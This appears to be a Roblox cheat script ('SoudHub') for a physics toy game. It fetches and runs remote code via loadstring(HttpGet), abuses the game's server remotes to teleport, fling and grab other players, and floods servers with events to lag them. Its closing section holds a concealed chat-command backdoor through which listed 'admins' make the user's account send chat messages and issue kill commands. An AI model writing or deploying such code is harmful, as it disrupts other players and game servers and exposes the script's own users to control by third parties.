local OrionLib = loadstring(game:HttpGet("https://raw.githubusercontent.com/SoudHub/SoudHub-/refs/heads/main/Orion/Orion%20by%20Bliz_T"))()

-- Custom purple theme
OrionLib.Themes.Soud = {
    Main     = Color3.fromRGB(10, 0, 15),
    Second   = Color3.fromRGB(25, 0, 35), 
    Stroke   = Color3.fromRGB(180, 100, 255),
    Divider  = Color3.fromRGB(120, 60, 200),
    Text     = Color3.fromRGB(220, 180, 255),
    TextDark = Color3.fromRGB(180, 140, 230)
}

OrionLib.SelectedTheme = "Soud"

-- Create main window
local Window = OrionLib:MakeWindow({
    Name = "SoudHub PC",
    HidePremium = false,
    SaveConfig = true,
    ConfigFolder = "HentaiConfig",
    IntroEnabled = false,
    IntroText = "Join in Discord"
})

    local ADMIN_LIST = {
    [9584241219] = true, --Pato_Soud
    [90063030] = true,   --Bliz
    [2872041329] = true, --Dead Asche
    [9415770424] = true, --Mentazap
    [2725331397] = true, --Mahkfc
    [7197612236] = true, --Shizuku
    [3037300800] = true, --Osama
    [3533639732] = true, --KLIO
    [3931453699] = true, --Dudu
    [4300907235] = true, --Tsuki
    [1137443778] = true  --Raxixe
}

-- Global variables
local Players = game:GetService("Players")
local selectedPlayer = nil
local plr = game.Players.LocalPlayer
local rs = game:GetService("ReplicatedStorage")
local uis = game:GetService("UserInputService")
local cam = workspace.CurrentCamera
local mouse = plr:GetMouse()
local inv = workspace:WaitForChild(plr.Name.."SpawnedInToys")
local currentHouseS = 0

-- Auto Gucci variables
local autoGucciT = false
local destroyAutoGucciT = true
local sitJumpT = false
local blobmanInstanceS = nil
local ragdollLoopD = false

-- Anti-Grab variables
local antiGrabT = false
local antiGrabAnchorT = true
local antiBlobT = false
local antiExplodeT = true

-- Teleport system variables
local teleportKeybind = Enum.KeyCode.T
local teleportConnection = nil

-- Inspection system variables
local inspectT = false
local inspectInfoT = false
local inspectInfoOnT = false
local currentInspectS = 0
local currentHouseInspectS = 0
local currentInspectedAdorneeS = nil
local currentInspectedPartS = nil
local inspectD = false
local highlightInstance = nil
local billboardInstance = nil

-- Player Tab variables
local walkSpeedT = false
local walkSpeedV = 16
local infJumpT = false
local jumpPowerV = 16
local infJumpD = false
local noClipT = false
local returnPosS = CFrame.new()

-- Lag variables
local lagT = false
local pingT = false
local shurikenLagServerT = false
local linesV = 10
local packetsV = 100

-- Player Selection variables
local selectedPlayer = nil
local teleportLoop = false
local bringLoop = false

-- Blobman Tab variables
local blobmanAutoFarm = false
local blobmanFarmSpeed = 1
local _G = {
    BlobmanDelay = 0.005,
    ToyToLoad = "BombMissile",
    MaxMissiles = 9
}

-- Anchor Grab variables
local anchorGrabEnabled = false
local anchoredParts = {}
local anchoredConnections = {}

-- Lines (Force System) variables
local lineStrength = 400
local lineForceEnabled = false
local lineStrengthConnection = nil

-- Settings for Lines Tab
local Config = {
    throwStrength = 100,
    forceEnabled = false,
    slideHeight = 50,
    autoHeight = false,
    infiniteMode = false
}

local AutoRecoverDroppedPartsCoroutine
local connectionBombReload
local reloadBombCoroutine
local antiExplosionConnection
local poisonAuraCoroutine
local deathAuraCoroutine
local reloadBombCoroutine
local poisonCoroutines = {}
local strengthConnection
local coroutineRunning = false
local autoStruggleCoroutine
local autoDefendCoroutine
local auraCoroutine
local gravityCoroutine
local kickCoroutine
local kickGrabCoroutine
local hellSendGrabCoroutine
local anchoredParts = {}
local anchoredConnections = {}
local compiledGroups = {}
local compileConnections = {}
local compileCoroutine
local fireAllCoroutine
local connections = {}
local renderSteppedConnections = {}
local ragdollAllCoroutine
local crouchJumpCoroutine
local crouchSpeedCoroutine
local anchorGrabCoroutine
local poisonGrabCoroutine
local ufoGrabCoroutine
local burnPart
local fireGrabCoroutine
local noclipGrabCoroutine
local antiKickCoroutine
local kickGrabConnections = {}
local blobmanCoroutine
local lighBitSpeedCoroutine
local lightbitpos = {}
local lightbitparts = {}
local lightbitcon
local lightbitcon2
local lightorbitcon
local bodyPositions = {}
local alignOrientations = {}



local decoyOffset = 15
local stopDistance = 5
local circleRadius = 10
local circleSpeed = 2
local auraToggle = 1
local crouchWalkSpeed = 50
local crouchJumpPower = 50
local kickMode = 1
local auraRadius = 20
local lightbit = 0.3125
local lightbitoffset = 1
local lightbitradius = 20
local usingradius = lightbitradius

_G.CurrentFOV = 70

-- Instances for inspection
local highlight = Instance.new("Highlight")
highlight.Name = "highlight"
highlight.Enabled = true
highlight.FillTransparency = 0.9
highlight.OutlineTransparency = 0

local billboard = Instance.new("BillboardGui")
billboard.Name = "billboard"
billboard.Size = UDim2.new(0, 100, 0, 150)
billboard.StudsOffset = Vector3.new(0, 1, 0)
billboard.AlwaysOnTop = true

local scrollframe = Instance.new("ScrollingFrame")
scrollframe.Name = "scrollframe"
scrollframe.ScrollingEnabled = true
scrollframe.BackgroundTransparency = 0.7

local textlabel = Instance.new("TextLabel")
textlabel.Name = "textlabel"
textlabel.TextScaled = true
textlabel.BackgroundTransparency = 1

-- Blobman system variables from provided script
local blobalter = 1
local blobman = nil
local blobmanCoroutine = nil
local bombList = {}
local reloadBombCoroutine = nil
local connectionBombReload = nil

-- Whitelist for lag functions
local Whitelist = {
    "Hp3SS",
    "Blizz_T"
}

-- FUNCTION GETPLAYERLIST
function GetPlayerList()
    local playerList = {"None"}
    for _, player in ipairs(Players:GetPlayers()) do
        if player ~= Players.LocalPlayer then
            table.insert(playerList, player.Name)
        end
    end
    return playerList
end

-- Function to teleport to player
function TeleportToPlayer(targetPlayer)
    if not targetPlayer or not targetPlayer.Character then 
        OrionLib:MakeNotification({
            Name = "Error",
            Content = "Player not found or has no character!",
            Time = 3
        })
        return false
    end
    
    local targetHRP = targetPlayer.Character:FindFirstChild("HumanoidRootPart")
    local localChar = plr.Character
    local localHRP = localChar and localChar:FindFirstChild("HumanoidRootPart")
    
    if not targetHRP or not localHRP then
        OrionLib:MakeNotification({
            Name = "Error",
            Content = "Could not find required parts!",
            Time = 3
        })
        return false
    end
    
    -- Teleport near the player
    localHRP.CFrame = targetHRP.CFrame * CFrame.new(0, 0, 5)
    
    OrionLib:MakeNotification({
        Name = "Teleported!",
        Content = "Teleported to: " .. targetPlayer.Name,
        Time = 3
    })
    
    return true
end

-- FUNCTION TO CLEAR INSPECTION
local function clearInspection()
    if highlightInstance then
        highlightInstance:Destroy()
        highlightInstance = nil
    end
    
    if billboardInstance then
        billboardInstance:Destroy()
        billboardInstance = nil
    end
    
    currentInspectS = 0
    currentHouseInspectS = 0
    currentInspectedAdorneeS = nil
    currentInspectedPartS = nil
    inspectInfoOnT = false
end

-- TELEPORT KEYBIND FUNCTION
local function setupTeleportKeybind()
    return uis.InputBegan:Connect(function(input, gameProcessed)
        if gameProcessed then return end
        
        if input.KeyCode == teleportKeybind then
            local char = plr.Character
            if not char then return end
            local hrp = char:FindFirstChild("HumanoidRootPart")
            if not hrp then return end
            
            if mouse.Target then 
                hrp.CFrame = CFrame.new(mouse.Hit.X, mouse.Hit.Y + 5, mouse.Hit.Z)
            end
        end
    end)
end

-- PLAYER TAB FUNCTIONS
local function updateWalkSpeedF()
    local char = plr.Character
    if not char then return end
    local hum = char:FindFirstChild("Humanoid")
    if not hum then return end
    
    if walkSpeedT then
        hum.WalkSpeed = walkSpeedV
    else
        hum.WalkSpeed = 16
    end
    
    hum:GetPropertyChangedSignal("WalkSpeed"):Connect(function()
        if walkSpeedT then
            hum.WalkSpeed = walkSpeedV
        else
            hum.WalkSpeed = 16
        end
    end)
end

local function updateJumpPowerF()
    local char = plr.Character
    if not char then return end
    local hum = char:FindFirstChild("Humanoid")
    if not hum then return end
    
    if infJumpT then
        hum.JumpPower = jumpPowerV
    else
        hum.JumpPower = 50
    end
end

local function updateNoClipF()
    local char = plr.Character
    if not char then return end
    
    while noClipT and task.wait(0.1) do
        for _, part in pairs(char:GetChildren()) do
            if part:IsA("BasePart") then
                part.CanCollide = false
            end
        end
    end
    
    if not noClipT then
        for _, part in pairs(char:GetChildren()) do
            if part:IsA("BasePart") then
                part.CanCollide = true
            end
        end
    end
end

-- INFINITE JUMP FUNCTION
local function setupInfiniteJump()
    uis.JumpRequest:Connect(function()
        if infJumpT and not infJumpD then
            infJumpD = true
            local hum = plr.Character and plr.Character:FindFirstChildOfClass("Humanoid")
            if hum then
                hum:ChangeState(Enum.HumanoidStateType.Jumping)
            end
            task.wait()
            infJumpD = false
        end
    end)
end

-- INSPECTION FUNCTIONS
local function mouseTargetInspectF()
    local char = plr.Character
    if not char then return end
    local hrp = char:FindFirstChild("HumanoidRootPart")
    local hum = char:FindFirstChild("Humanoid")
    if not hrp or not hum then return end
    
    if mouse.Target then
        -- Check if already inspecting the same object
        if currentInspectedAdorneeS and currentInspectedAdorneeS == mouse.Target.Parent then
            clearInspection()
            return true
        end
        
        -- Clear previous inspection
        clearInspection()
        
        if mouse.Target.Parent:FindFirstChildOfClass("Humanoid") then
            currentInspectS = 1
            currentHouseInspectS = 0
        elseif mouse.Target.Parent:IsDescendantOf(workspace.Plots) then
            local current = mouse.Target
            repeat
                current = current.Parent
            until current == nil or string.match(current.Name, "Plot")
            
            if current then
                for i = 1, 5 do
                    if current.Name == "Plot"..i then
                        currentHouseInspectS = i
                    end
                end
                currentInspectS = 2
            end
        elseif mouse.Target.Parent:IsDescendantOf(workspace.PlotItems) or 
               (mouse.Target.Parent.Parent and string.match(mouse.Target.Parent.Parent.Name, "SpawnedInToys")) or 
               (mouse.Target.Parent.Parent and mouse.Target.Parent.Parent:FindFirstChild("SpawningPlatform")) then
            currentInspectS = 3
            currentHouseInspectS = 0
        else
            currentInspectS = 4
            currentHouseInspectS = 0
        end
        return false
    end
    return false
end

local function inspectF()
    local char = plr.Character
    if not char then return end
    local hrp = char:FindFirstChild("HumanoidRootPart")
    local hum = char:FindFirstChild("Humanoid")
    if not hrp or not hum then return end
    
    local isSameObject = mouseTargetInspectF()
    
    if isSameObject then
        return
    end
    
    if not inspectD then
        inspectD = true
        
        if inspectT and currentInspectS ~= 0 then
            if currentInspectS == 1 then
                currentInspectedAdorneeS = mouse.Target.Parent
                currentInspectedPartS = mouse.Target
                highlightInstance = highlight:Clone()
                highlightInstance.Adornee = mouse.Target.Parent
                highlightInstance.Parent = mouse.Target
                highlightInstance.FillColor = Color3.fromRGB(255, 255, 255)
                highlightInstance.OutlineColor = Color3.fromRGB(160, 11, 11)
            elseif currentInspectS == 2 then
                currentInspectedAdorneeS = workspace.Plots:FindFirstChild("Plot"..currentHouseInspectS)
                currentInspectedPartS = mouse.Target
                highlightInstance = highlight:Clone()
                highlightInstance.Adornee = workspace.Plots:FindFirstChild("Plot"..currentHouseInspectS)
                highlightInstance.Parent = mouse.Target
                highlightInstance.FillColor = Color3.fromRGB(255, 255, 255)
                highlightInstance.OutlineColor = Color3.fromRGB(0, 60, 180)
            elseif currentInspectS == 3 then
                currentInspectedAdorneeS = mouse.Target.Parent
                currentInspectedPartS = mouse.Target
                highlightInstance = highlight:Clone()
                highlightInstance.Adornee = mouse.Target.Parent
                highlightInstance.Parent = mouse.Target
                highlightInstance.FillColor = Color3.fromRGB(255, 255, 255)
                highlightInstance.OutlineColor = Color3.fromRGB(20, 170, 20)
            elseif currentInspectS == 4 then
                currentInspectedAdorneeS = mouse.Target.Parent
                currentInspectedPartS = mouse.Target
                highlightInstance = highlight:Clone()
                highlightInstance.Adornee = mouse.Target.Parent
                highlightInstance.Parent = mouse.Target
                highlightInstance.FillColor = Color3.fromRGB(255, 255, 255)
                highlightInstance.OutlineColor = Color3.fromRGB(180, 20, 180)
            end
        else
            clearInspection()
        end
        
        task.wait(0.1)
        inspectD = false
    end
end

local function inspectInfoF()
    local char = plr.Character
    if not char then return end
    local hrp = char:FindFirstChild("HumanoidRootPart")
    local hum = char:FindFirstChild("Humanoid")
    if not hrp or not hum then return end
    
    if not inspectInfoOnT and inspectInfoT and inspectT and currentInspectS ~= 0 and currentInspectedPartS ~= nil and currentInspectedAdorneeS ~= nil then
        inspectInfoOnT = true
        billboardInstance = billboard:Clone()
        billboardInstance.Adornee = currentInspectedAdorneeS
        billboardInstance.Parent = currentInspectedPartS

        local scrollframeC = scrollframe:Clone()
        scrollframeC.Parent = billboardInstance
        scrollframeC.Size = UDim2.new(0, 160, 0, 60)
        scrollframeC.ScrollBarImageTransparency = 1 

        local textlabelC1 = textlabel:Clone()
        textlabelC1.Parent = scrollframeC
        textlabelC1.Size = UDim2.new(0, 140, 0, 30)
        textlabelC1.Position = UDim2.new(0, 0, 0, 0)
        
        local textlabelC2 = textlabel:Clone()
        textlabelC2.Parent = scrollframeC
        textlabelC2.Size = UDim2.new(0, 140, 0, 30)
        textlabelC2.Position = UDim2.new(0, 0, 0, 30)
        
        if currentInspectS == 1 then
            local player = game.Players:FindFirstChild(currentInspectedAdorneeS.Name)
            if player then
                -- Show both names: username and display name
                textlabelC1.Text = "Username: " .. player.Name
                textlabelC2.Text = "Display: " .. player.DisplayName
            else
                textlabelC1.Text = currentInspectedAdorneeS.Name
                textlabelC2.Text = ""
            end
        else
            textlabelC1.Text = currentInspectedAdorneeS.Name
            textlabelC2.Text = ""
        end
    elseif not inspectInfoT and inspectInfoOnT or not inspectT and inspectInfoOnT then
        inspectInfoOnT = false
        if billboardInstance then
            billboardInstance:Destroy()
            billboardInstance = nil
        end
    end
end

local function inspectBringF()
    local char = plr.Character
    if not char then return end
    local hrp = char:FindFirstChild("HumanoidRootPart")
    local hum = char:FindFirstChild("Humanoid")
    if not hrp or not hum then return end
    
    if inspectT and currentInspectS ~= 2 and currentInspectS ~= 4 then
        returnPosS = hrp.CFrame
        hrp.CFrame = currentInspectedAdorneeS.PrimaryPart.CFrame + Vector3.new(7, 3, 0)
        task.wait(0.15)
        
        if currentInspectS == 1 then
            local humanoidRootPart = currentInspectedAdorneeS:FindFirstChild("HumanoidRootPart")
            if humanoidRootPart then
                pcall(function()
                    rs.GrabEvents.SetNetworkOwner:FireServer(humanoidRootPart, humanoidRootPart.CFrame)
                end)
                task.wait(0.1)
                humanoidRootPart.CFrame = returnPosS
            end
        else
            local primaryPart = currentInspectedAdorneeS.PrimaryPart
            if primaryPart then
                pcall(function()
                    rs.GrabEvents.SetNetworkOwner:FireServer(primaryPart, primaryPart.CFrame)
                end)
                task.wait(0.1)
                primaryPart.CFrame = returnPosS
            end
        end
        hrp.CFrame = returnPosS
    elseif not inspectT then
        if mouse.Target and mouse.Target.Parent then
            if mouse.Target.Parent:IsDescendantOf(workspace.PlotItems) or 
               (mouse.Target.Parent.Parent and string.match(mouse.Target.Parent.Parent.Name, "SpawnedInToys")) or 
               (mouse.Target.Parent.Parent and mouse.Target.Parent.Parent:FindFirstChild("SpawningPlatform")) or 
               mouse.Target.Parent:FindFirstChildOfClass("Humanoid") then
                returnPosS = hrp.CFrame
                local mouseTargetS = mouse.Target
                hrp.CFrame = mouseTargetS.Parent.PrimaryPart.CFrame + Vector3.new(10, 3, 0)
                task.wait(0.15)
                
                if mouseTargetS.Parent:FindFirstChildOfClass("Humanoid") then
                    local humanoidRootPart = mouseTargetS.Parent:FindFirstChild("HumanoidRootPart")
                    if humanoidRootPart then
                        pcall(function()
                            rs.GrabEvents.SetNetworkOwner:FireServer(humanoidRootPart, humanoidRootPart.CFrame)
                        end)
                        task.wait(0.1)
                        humanoidRootPart.CFrame = returnPosS
                    end
                else
                    local primaryPart = mouseTargetS.Parent.PrimaryPart
                    if primaryPart then
                        pcall(function()
                            rs.GrabEvents.SetNetworkOwner:FireServer(primaryPart, primaryPart.CFrame)
                        end)
                        task.wait(0.1)
                        primaryPart.CFrame = returnPosS
                    end
                end
                hrp.CFrame = returnPosS
            end
        end
    end
end

-- ANTI-EXPLODE FUNCTION --
local function antiExplodeF()
    local char = plr.Character
    if not char then return end
    local hrp = char:FindFirstChild("HumanoidRootPart")
    local hum = char:FindFirstChild("Humanoid")
    if not hrp or not hum then return end
    
    workspace.ChildAdded:Connect(function(model)
        if model.Name == "Part" and char ~= nil and antiExplodeT then
            local mag = (model.Position - hrp.Position).Magnitude
            if mag <= 20 then
                hrp.Anchored = true
                task.wait(0.01)
                local rightArm = char:FindFirstChild("Right Arm")
                if rightArm and rightArm:FindFirstChild("RagdollLimbPart") then
                    while rightArm.RagdollLimbPart.CanCollide == true do task.wait(0.001) end
                end
                hrp.Anchored = false
            end
        end
    end)
end

-- ANTI-GRAB FUNCTIONS --
local function antiGrabF()
    local char = plr.Character
    if not char then return end
    local hrp = char:FindFirstChild("HumanoidRootPart")
    local hum = char:FindFirstChild("Humanoid")
    if not hrp or not hum then return end
    
    while antiGrabT and task.wait() do
        if plr:FindFirstChild("IsHeld") and plr.IsHeld.Value == true and antiGrabT == true then
            if hrp ~= nil then
                if antiGrabAnchorT then
                    hrp.Anchored = true
                    while plr.IsHeld.Value == true do 
                        pcall(function()
                            rs.CharacterEvents.Struggle:FireServer(plr)
                        end)
                        task.wait(0.001) 
                    end
                    hrp.Anchored = false
                elseif not antiGrabAnchorT then
                    while plr.IsHeld.Value == true do 
                        pcall(function()
                            rs.CharacterEvents.Struggle:FireServer(plr)
                        end)
                        task.wait(0.001) 
                    end
                end
            end
        end
    end
end

local function antiBlobF()
    workspace.DescendantAdded:Connect(function(toy)
        if toy.Name == "CreatureBlobman" and toy.Parent ~= inv and antiBlobT then
            task.wait()
            local leftDetector = toy:FindFirstChild("LeftDetector")
            local rightDetector = toy:FindFirstChild("RightDetector")
            if leftDetector then leftDetector:Destroy() end
            if rightDetector then rightDetector:Destroy() end
        end
    end)
end

-- Functions needed for Auto Gucci
local function updateCurrentHouseF()
    local char = plr.Character
    if not char then return end
    
    if char.Parent == workspace then
        currentHouseS = 0
    elseif char.Parent.Name == "PlayersInPlots" then
        for _, plot in workspace.Plots:GetChildren() do
            local owners = plot.PlotSign and plot.PlotSign:FindFirstChild("ThisPlotsOwners")
            if owners then
                for _, owner in owners:GetChildren() do
                    if owner.Value == plr.Name then
                        currentHouseS = tonumber(plot.Name:match("%d+")) or 0
                        return
                    end
                end
            end
        end
    end
end

local function getBlobmanF()
    local char = plr.Character
    if not char then return end
    
    updateCurrentHouseF()
    if currentHouseS == 0 then
        if inv then return inv:FindFirstChild("CreatureBlobman") end
        return nil
    else
        local plot = workspace.PlotItems:FindFirstChild("Plot"..currentHouseS)
        if plot then
            return plot:FindFirstChild("CreatureBlobman")
        end
        return nil
    end
end

local function spawnBlobmanF()
    local char = plr.Character
    if not char then return end
    local hrp = char:FindFirstChild("HumanoidRootPart")
    local hum = char:FindFirstChild("Humanoid")
    if not hrp or not hum then return end
    
    local spawnRemote = rs:WaitForChild("MenuToys"):WaitForChild("SpawnToyRemoteFunction")
    if spawnRemote then
        pcall(function()
            spawnRemote:InvokeServer("CreatureBlobman", hrp.CFrame*CFrame.new(0,0,-5), Vector3.new(0, -15.716, 0))
        end)
        task.wait(1)
        blobmanInstanceS = getBlobmanF()
    end
end

local function destroyBlobmanF()
    local char = plr.Character
    if not char then return end
    local hrp = char:FindFirstChild("HumanoidRootPart")
    local hum = char:FindFirstChild("Humanoid")
    if not hrp or not hum then return end
    
    if blobmanInstanceS and destroyAutoGucciT then
        if currentHouseS == 0 then
            local args = {[1] = blobmanInstanceS}
            local destroyRemote = rs:FindFirstChild("MenuToys") and rs.MenuToys:FindFirstChild("DestroyToy")
            if destroyRemote then 
                pcall(function()
                    destroyRemote:FireServer(unpack(args))
                end)
            end
            blobmanInstanceS = nil
        else
            local plot = workspace.Plots:FindFirstChild("Plot"..currentHouseS)
            if plot and plot:FindFirstChild("TeslaCoil") then
                local zapPart = plot.TeslaCoil:FindFirstChild("ZapPart")
                if zapPart then
                    blobmanInstanceS.HumanoidRootPart.CFrame = zapPart.CFrame
                end
            end
            blobmanInstanceS = nil
        end
    end
end

local function ragdollLoopF()
    local char = plr.Character
    if not char then return end
    local hrp = char:FindFirstChild("HumanoidRootPart")
    local hum = char:FindFirstChild("Humanoid")
    if not hrp or not hum then return end
    
    if ragdollLoopD then return end
    ragdollLoopD = true
    
    while sitJumpT do
        if char and hrp then
            local args = {[1] = hrp, [2] = 0}
            pcall(function()
                rs:WaitForChild("CharacterEvents"):WaitForChild("RagdollRemote"):FireServer(unpack(args))
            end)
        end
        task.wait()
    end
    
    ragdollLoopD = false
end

local function sitJumpF()
    local char = plr.Character
    if not char then return end
    local hrp = char:FindFirstChild("HumanoidRootPart")
    local hum = char:FindFirstChild("Humanoid")
    if not hrp or not hum then return end
    
    local startTime = tick()
    while autoGucciT and tick()-startTime < 6 do
        if blobmanInstanceS then
            local seat = blobmanInstanceS:FindFirstChildWhichIsA("VehicleSeat")
            if seat and seat.Occupant ~= hum then 
                seat:Sit(hum) 
            end
        end
        task.wait(0.1)
        if char and hum then 
            hum:ChangeState(Enum.HumanoidStateType.Jumping)
        end
        task.wait(0.1)
    end
    
    if blobmanInstanceS then 
        destroyBlobmanF() 
    end
    autoGucciT = false
    sitJumpT = false
end
--fov
local function changeFOV(value)
    _G.CurrentFOV = value
    local camera = workspace.CurrentCamera
    if camera then
        camera.FieldOfView = value
    end
end

-- BLOBMAN SYSTEM FUNCTIONS FROM PROVIDED SCRIPT
local function isDescendantOf(target, other)
    local currentParent = target.Parent
    while currentParent do
        if currentParent == other then
            return true
        end
        currentParent = currentParent.Parent
    end
    return false
end

local function DestroyT(toy)
    local toy = toy or inv:FindFirstChildWhichIsA("Model")
    rs.MenuToys.DestroyToy:FireServer(toy)
end

local function blobGrabPlayer(player, blobman)
    if blobalter == 1 then
        if player.Character and player.Character:FindFirstChild("HumanoidRootPart") then
            local args = {
                [1] = blobman:FindFirstChild("LeftDetector"),
                [2] = player.Character:FindFirstChild("HumanoidRootPart"),
                [3] = blobman:FindFirstChild("LeftDetector"):FindFirstChild("LeftWeld")
            }
            blobman:WaitForChild("BlobmanSeatAndOwnerScript"):WaitForChild("CreatureGrab"):FireServer(unpack(args))
            blobalter = 2
        end
    else
        if player.Character and player.Character:FindFirstChild("HumanoidRootPart") then
            local args = {
                [1] = blobman:FindFirstChild("RightDetector"),
                [2] = player.Character:FindFirstChild("HumanoidRootPart"),
                [3] = blobman:FindFirstChild("RightDetector"):FindFirstChild("RightWeld")
            }
            blobman:WaitForChild("BlobmanSeatAndOwnerScript"):WaitForChild("CreatureGrab"):FireServer(unpack(args))
            blobalter = 1
        end
    end
end

local function reloadMissile(bool)
    if bool then
        if not reloadBombCoroutine then
            reloadBombCoroutine = coroutine.create(function()
                connectionBombReload = inv.ChildAdded:Connect(function(child)
                    if child.Name == _G.ToyToLoad and child:WaitForChild("ThisToysNumber", 1) then
                        if child.ThisToysNumber.Value == (inv.ToyNumber.Value - 1) then
                            local connection2
                            connection2 = inv.ChildRemoved:Connect(function(child2)
                                if child2 == child then
                                    connection2:Disconnect()
                                end
                            end)

                            rs.GrabEvents.SetNetworkOwner:FireServer(child.Body, child.Body.CFrame)
                            local waiting = child.Body:WaitForChild("PartOwner", 0.5)
                            local connection = child.DescendantAdded:Connect(function(descendant)
                                if descendant.Name == "PartOwner" then
                                    if descendant.Value ~= plr.Name then
                                        DestroyT(child)
                                        connection:Disconnect()
                                    end
                                end
                            end)
                            game:GetService("Debris"):AddItem(connection, 60)
                            if waiting and waiting.Value == plr.Name then
                                for _, v in pairs(child:GetChildren()) do
                                    if v:IsA("BasePart") then
                                        v.CanCollide = false
                                    end
                                end
                                child:SetPrimaryPartCFrame(CFrame.new(-72.9304581, -3.96906614, -265.543732))
                                task.wait(0.2)
                                for _, v in pairs(child:GetChildren()) do
                                    if v:IsA("BasePart") then
                                        v.Anchored = true
                                    end
                                end
                                table.insert(bombList, child)
                                child.AncestryChanged:Connect(function()
                                    if not child.Parent then
                                        for i, bomb in ipairs(bombList) do
                                            if bomb == child then
                                                table.remove(bombList, i)
                                                break
                                            end
                                        end
                                    end
                                end)
                                connection2:Disconnect()
                            else
                                DestroyT(child)
                            end
                        end
                    end
                end)

                while true do
                    if plr:FindFirstChild("CanSpawnToy") and plr.CanSpawnToy.Value and #bombList < _G.MaxMissiles and plr.Character:FindFirstChild("Head") then
                        local spawnRemote = rs:WaitForChild("MenuToys"):WaitForChild("SpawnToyRemoteFunction")
                        spawnRemote:InvokeServer(_G.ToyToLoad, plr.Character.Head.CFrame or plr.Character.HumanoidRootPart.CFrame, Vector3.new(0, 0, 0))
                    end
                    task.wait()
                end
            end)
            coroutine.resume(reloadBombCoroutine)
        end
    else
        if reloadBombCoroutine then
            coroutine.close(reloadBombCoroutine)
            reloadBombCoroutine = nil
        end
        if connectionBombReload then
            connectionBombReload:Disconnect()
        end
    end
end

-- FUNCTIONS FOR PLAYER SELECTION
local function getPlayers()
    local players = {}
    for _, player in ipairs(game.Players:GetPlayers()) do
        if player ~= plr then
            table.insert(players, player.Name)
        end
    end
    return players
end

local function teleportToPlayer(player)
    local char = plr.Character
    if not char then return end
    local hrp = char:FindFirstChild("HumanoidRootPart")
    if not hrp then return end
    
    local targetChar = player.Character
    if not targetChar then return end
    local targetHrp = targetChar:FindFirstChild("HumanoidRootPart")
    if not targetHrp then return end
    
    hrp.CFrame = targetHrp.CFrame
end

-- FUNCTIONS FOR BLOBMAN TAB
local function blobmanFarmF()
    while blobmanAutoFarm and task.wait(blobmanFarmSpeed) do
        spawnBlobmanF()
        task.wait(0.5)
        
        if blobmanInstanceS then
            -- Make Blobman follow you
            local char = plr.Character
            if char and char:FindFirstChild("HumanoidRootPart") then
                local humanoid = blobmanInstanceS:FindFirstChildOfClass("Humanoid")
                if humanoid then
                    humanoid:MoveTo(char.HumanoidRootPart.Position)
                end
            end
            
            task.wait(3)
            destroyBlobmanF()
        end
    end
end

-- Lag Functions
function lagF()
    local char = plr.Character
    if not char then return end
    local hrp = char:WaitForChild("HumanoidRootPart")
    local hum = char:WaitForChild("Humanoid")
    
    for i, e in ipairs(game.Players:GetPlayers()) do
        if table.find(Whitelist, e.Name) then
            return
        end
    end
    
    while task.wait(1) and lagT do
        for a = 0, linesV do
            for _, player in ipairs(game:GetService("Players"):GetPlayers()) do
                if player.Character and player.Character:FindFirstChild("Torso") then
                    rs.GrabEvents.CreateGrabLine:FireServer(player.Character.Torso, player.Character.Torso.CFrame)
                end
            end
        end
    end
end

function pingF()
    for i, e in ipairs(game.Players:GetPlayers()) do
        if table.find(Whitelist, e.Name) then
            return
        end
    end
    
    local char = plr.Character
    if not char then return end
    local hrp = char:WaitForChild("HumanoidRootPart")
    local hum = char:WaitForChild("Humanoid")
    
    while task.wait() and pingT do
        rs.GrabEvents.ExtendGrabLine:FireServer(string.rep("Balls Balls Balls Balls", packetsV))
    end
end

function shurikenLagServerF()
    while shurikenLagServerT do
        pcall(function()
            for i = 1, 10 do
                rs.MenuToys.SpawnToyRemoteFunction:InvokeServer("Shuriken", CFrame.new(0, 0, 0), Vector3.new(0, 0, 0))
            end
        end)
        task.wait(0.1)
    end
end

-- Configure teleport system initially
teleportConnection = setupTeleportKeybind()

-- Configure infinite jump
setupInfiniteJump()

--CMDS
local Players = game:GetService("Players")
local TextChatService = game:GetService("TextChatService")

--admins no topo
--[] = false
-- Tabela para controlar loops ativos
local activeLoops = {}

-- Função para encontrar um jogador pelo nome
local function findPlayer(targetName)
    if not targetName or targetName == "" then
        return nil
    end
    
    targetName = targetName:lower()
    for _, player in ipairs(Players:GetPlayers()) do
        if player.Name:lower():sub(1, #targetName) == targetName then
            return player
        end
    end
    return nil
end

-- Função para iniciar loop de morte
local function startKillLoop(player)
    activeLoops[player.UserId] = true
    
    -- Usa corrotina para loop infinito
    task.spawn(function()
        while activeLoops[player.UserId] do
            if player.Character then
                local humanoid = player.Character:FindFirstChildOfClass("Humanoid")
                if humanoid and humanoid.Health > 0 then
                    humanoid.Health = 0
                end
            end
            task.wait(2) -- Espera 2 segundos entre cada morte
        end
    end)
end

-- Função para parar loop de morte
local function stopKillLoop(player)
    activeLoops[player.UserId] = nil
end

-- Escuta quando um jogador envia uma mensagem
Players.PlayerAdded:Connect(function(player)
    player.Chatted:Connect(function(message)
        -- Verifica se a mensagem veio de um administrador
        if ADMIN_LIST[player.UserId] then
            local loweredMsg = message:lower()
            
            -- Comando :reveal
            if loweredMsg == ":reveal all" then
                TextChatService.TextChannels.RBXGeneral:SendAsync("Im use SoudHub")
            
            -- Comando :loopkill [nome]
            elseif loweredMsg:sub(1, 9) == ":loopkill" then
                local targetName = string.sub(message, 11) -- Pega o nome após ":loopkill "
                local targetPlayer = findPlayer(targetName)
                
                if targetPlayer then
                    startKillLoop(targetPlayer)
                    print(player.Name .. " ativou loopkill em " .. targetPlayer.Name)
                else
                    print("Jogador não encontrado: " .. tostring(targetName))
                end
            
            -- Comando :unloopkill [nome]
            elseif loweredMsg:sub(1, 11) == ":unloopkill" then
                local targetName = string.sub(message, 13) -- Pega o nome após ":unloopkill "
                local targetPlayer = findPlayer(targetName)
                
                if targetPlayer then
                    stopKillLoop(targetPlayer)
                    print(player.Name .. " desativou loopkill em " .. targetPlayer.Name)
                else
                    print("Jogador não encontrado: " .. tostring(targetName))
                end
            
            -- Comando :chat [mensagem]
            elseif loweredMsg:sub(1, 6) == ":chat " then
                local chatMessage = string.sub(message, 7) -- Pega a mensagem após ":chat "
                TextChatService.TextChannels.RBXGeneral:SendAsync(chatMessage)
            
            -- Comando :kill [nome] (original)
            elseif loweredMsg:sub(1, 6) == ":kill " then
                local targetName = string.sub(message, 7) -- Pega o nome após ":kill "
                local targetPlayer = findPlayer(targetName)
                
                if targetPlayer and targetPlayer.Character then
                    local humanoid = targetPlayer.Character:FindFirstChildOfClass("Humanoid")
                    if humanoid then
                        humanoid.Health = 0
                        print(player.Name .. " matou " .. targetPlayer.Name)
                    end
                else
                    print("Jogador não encontrado: " .. tostring(targetName))
                end
            end
        end
    end)
end)

